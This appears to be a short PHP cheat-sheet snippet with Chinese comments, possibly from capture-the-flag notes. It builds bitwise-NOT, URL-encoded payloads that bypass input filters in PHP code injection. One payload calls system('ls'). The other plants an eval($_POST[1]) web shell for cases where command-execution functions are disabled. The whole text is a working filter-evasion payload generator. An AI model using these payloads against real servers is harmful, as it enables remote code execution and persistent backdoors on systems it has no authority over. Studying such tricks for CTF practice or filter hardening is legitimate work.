//普通情况
<?php 
$func='system';
$arg='("ls")';
$a=urlencode(~$func);
$b=urlencode(~$arg);
echo "(~".$a.")"."(~".$b.");";
?>

//对于eval(xxx)但是rce函数被禁用的情况
<?php 
$func='assert';
$arg='(eval($_POST[1]))';
$a=urlencode(~$func);
$b=urlencode(~$arg);
echo "(~".$a.")"."(~".$b.");";
?>

